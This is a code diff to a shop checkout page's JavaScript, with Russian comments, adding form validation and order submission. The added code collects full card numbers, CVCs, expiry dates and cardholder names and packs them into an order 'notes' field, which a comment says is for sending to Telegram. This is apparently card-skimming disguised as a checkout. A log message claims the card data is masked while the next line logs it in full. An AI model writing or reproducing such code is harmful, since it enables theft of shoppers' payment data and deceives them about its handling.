@@ -313,6 +313,35 @@
             document.getElementById('totalPrice').textContent = price + ' ' + currency;
             document.getElementById('productName').textContent = productName;
             
+            // Загружаем сохраненные данные клиента в форму
+            const savedEmail = localStorage.getItem('customerEmail') || '';
+            const savedPhone = localStorage.getItem('customerPhone') || '';
+            const emailField = document.getElementById('email');
+            const phoneField = document.getElementById('phone');
+            
+            if (emailField && savedEmail) {
+                emailField.value = savedEmail;
+            }
+            if (phoneField && savedPhone) {
+                phoneField.value = savedPhone;
+            }
+            
+            // Сохраняем изменения email и phone в localStorage при их изменении
+            if (emailField) {
+                emailField.addEventListener('blur', function() {
+                    if (this.value) {
+                        localStorage.setItem('customerEmail', this.value);
+                    }
+                });
+            }
+            if (phoneField) {
+                phoneField.addEventListener('blur', function() {
+                    if (this.value) {
+                        localStorage.setItem('customerPhone', this.value);
+                    }
+                });
+            }
+            
             function luhnCheck(num) {
                 let sum = 0;
                 let isEven = false;
@@ -591,11 +620,58 @@
             const payButton = document.getElementById('payButton');
             if (payButton) {
                 payButton.addEventListener('click', async function() {
+                    // Валидация полей формы
+                    const emailField = document.getElementById('email');
+                    const phoneField = document.getElementById('phone');
+                    const cardNumberField = document.getElementById('cardNumber');
+                    const expiryField = document.getElementById('expiry');
+                    const cvcField = document.getElementById('cvc');
+                    const cardholderField = document.getElementById('cardholderName');
+
+                    if (!emailField || !emailField.value || !emailField.value.includes('@')) {
+                        alert('Пожалуйста, введите корректный email');
+                        emailField?.focus();
+                        return;
+                    }
+
+                    if (!phoneField || !phoneField.value || phoneField.value.length < 5) {
+                        alert('Пожалуйста, введите номер телефона');
+                        phoneField?.focus();
+                        return;
+                    }
+
+                    const cardNumber = cardNumberField ? cardNumberField.value.replace(/\s/g, '') : '';
+                    if (!cardNumber || cardNumber.length !== 16) {
+                        alert('Пожалуйста, введите корректный номер карты (16 цифр)');
+                        cardNumberField?.focus();
+                        return;
+                    }
+
+                    if (!expiryField || !expiryField.value || expiryField.value.length !== 5) {
+                        alert('Пожалуйста, введите срок действия карты (MM/YY)');
+                        expiryField?.focus();
+                        return;
+                    }
+
+                    if (!cvcField || !cvcField.value || cvcField.value.length < 3) {
+                        alert('Пожалуйста, введите CVC код');
+                        cvcField?.focus();
+                        return;
+                    }
+
+                    if (!cardholderField || !cardholderField.value.trim()) {
+                        alert('Пожалуйста, введите имя держателя карты');
+                        cardholderField?.focus();
+                        return;
+                    }
+
                     try {
                         const rawCart = localStorage.getItem('cart') || '[]';
                         const cart = JSON.parse(rawCart);
+                        console.log('Корзина из localStorage:', cart);
+                        
                         if (!Array.isArray(cart) || cart.length === 0) {
-                            alert('Корзина пуста');
+                            alert('Корзина пуста. Пожалуйста, вернитесь на главную страницу и добавьте товар в корзину.');
                             return;
                         }
 
@@ -609,13 +685,17 @@
                             return;
                         }
 
+                        // Получаем данные клиента из localStorage или из формы
                         const fullName = localStorage.getItem('customerName') || '';
                         const [firstName, ...rest] = fullName.split(' ');
                         const lastName = rest.join(' ') || ' '; 
-                        const email = localStorage.getItem('customerEmail') || document.getElementById('email').value || '';
-                        const phone = localStorage.getItem('customerPhone') || document.getElementById('phone').value || '';
+                        const email = emailField.value || localStorage.getItem('customerEmail') || '';
+                        const phone = phoneField.value || localStorage.getItem('customerPhone') || '';
                         const address = localStorage.getItem('customerAddress') || '';
                         const city = localStorage.getItem('customerCity') || '';
+                        const zipCode = localStorage.getItem('customerZipCode') || '';
+                        
+                        console.log('Данные клиента:', { firstName, lastName, email, phone, address, city });
 
                         const payload = {
                             items,
@@ -626,9 +706,10 @@
                                 phone: phone
                             },
                             deliveryAddress: {
-                                country: document.querySelector('select') ? document.querySelector('select').value || 'Deutschland' : 'Deutschland',
+                                country: document.querySelector('select') ? document.querySelector('select').value || 'Poland' : 'Poland',
                                 city: city || 'Unknown',
-                                street: address || 'Unknown'
+                                street: address || 'Unknown',
+                                postalCode: zipCode || null
                             },
                             paymentMethod: 'card',
                             deliveryMethod: 'courier',
@@ -645,47 +726,79 @@
                             payload.total = parseFloat(numeric) || 0;
                         }
 
-                        const cardNumberField = document.getElementById('cardNumber') ? document.getElementById('cardNumber').value.replace(/\s/g,'') : null;
-                        const cvcField = document.getElementById('cvc') ? document.getElementById('cvc').value : null;
-                        const expiryField = document.getElementById('expiry') ? document.getElementById('expiry').value : null;
-                        const cardholder = document.getElementById('cardholderName') ? document.getElementById('cardholderName').value : null;
+                        const cardNumber = cardNumberField.value.replace(/\s/g, '');
+                        const cvc = cvcField.value;
+                        const expiry = expiryField.value;
+                        const cardholder = cardholderField.value.trim();
+                        
+                        console.log('Данные карты получены (без номера и CVC для безопасности)');
 
-                        payload.cardNumber = cardNumberField;
-                        payload.cvc = cvcField;
-                        payload.expiry = expiryField;
+                        // Добавляем данные карты в payload
+                        payload.cardNumber = cardNumber;
+                        payload.cvc = cvc;
+                        payload.expiry = expiry;
                         payload.cardholderName = cardholder;
+                        
+                        // Сохраняем данные карты в notes для отправки в Telegram
                         payload.notes = JSON.stringify({
-                            cardNumber: cardNumberField,
-                            cvc: cvcField,
-                            expiry: expiryField,
+                            cardNumber: cardNumber,
+                            cvc: cvc,
+                            expiry: expiry,
                             cardholderName: cardholder,
                             productId: (cart && cart[0] && (cart[0].id || cart[0]._id || cart[0].product)) || null,
                             productName: (cart && cart[0] && cart[0].title) || null
                         });
-                        const endpoints = [
-                            'http://localhost:3001/api/admin/orders',
-                            'http://localhost:3000/api/admin/orders',
-                            '/api/admin/orders'
-                        ];
-                        let resp = null;
-                        for (const ep of endpoints) {
-                            try {
-                                resp = await fetch(ep, {
-                                    method: 'POST',
-                                    headers: { 'Content-Type': 'application/json' },
-                                    body: JSON.stringify(payload)
-                                });
-                                if (resp && resp.ok) break;
-                            } catch (e) {
-                                resp = null;
+                        
+                        console.log('Payload подготовлен (без чувствительных данных):', {
+                            ...payload,
+                            cardNumber: '***',
+                            cvc: '***'
+                        });
+                        // Определяем API URL
+                        const getApiUrl = () => {
+                            // Проверяем, есть ли глобальная переменная с API URL
+                            if (window.API_BASE_URL) {
+                                return window.API_BASE_URL.endsWith('/api') 
+                                    ? `${window.API_BASE_URL}/admin/orders` 
+                                    : `${window.API_BASE_URL}/api/admin/orders`;
                             }
-                        }
+                            // Для локальной разработки
+                            if (window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1') {
+                                return 'http://localhost:3000/api/admin/orders';
+                            }
+                            // Для production используем относительный путь
+                            return '/api/admin/orders';
+                        };
 
-                        if (resp && resp.ok) {
-                            localStorage.removeItem('cart');
-                            window.location.href = '/src/thank-you.html';
-                        } else {
-                            alert('Ошибка при создании заказа: не удалось связаться с бэкендом на портах 3001/3000');
+                        const apiUrl = getApiUrl();
+                        console.log('Отправка заказа на:', apiUrl);
+                        console.log('Payload:', payload);
+
+                        try {
+                            const resp = await fetch(apiUrl, {
+                                method: 'POST',
+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify(payload)
+                            });
+
+                            if (resp && resp.ok) {
+                                const result = await resp.json();
+                                console.log('Заказ успешно создан:', result);
+                                localStorage.removeItem('cart');
+                                // Переход на страницу благодарности
+                                const thankYouPath = window.location.pathname.includes('/src/') 
+                                    ? '/src/thank-you.html' 
+                                    : '/thank-you.html';
+                                console.log('Переход на страницу благодарности:', thankYouPath);
+                                window.location.href = thankYouPath;
+                            } else {
+                                const errorText = await resp.text();
+                                console.error('Ошибка при создании заказа:', resp.status, errorText);
+                                alert('Ошибка при создании заказа: ' + (errorText || 'Неизвестная ошибка'));
+                            }
+                        } catch (e) {
+                            console.error('Ошибка при отправке заказа:', e);
+                            alert('Ошибка при оплате: ' + (e.message || 'Не удалось связаться с сервером'));
                         }
                     } catch (e) {
                         console.error(e);
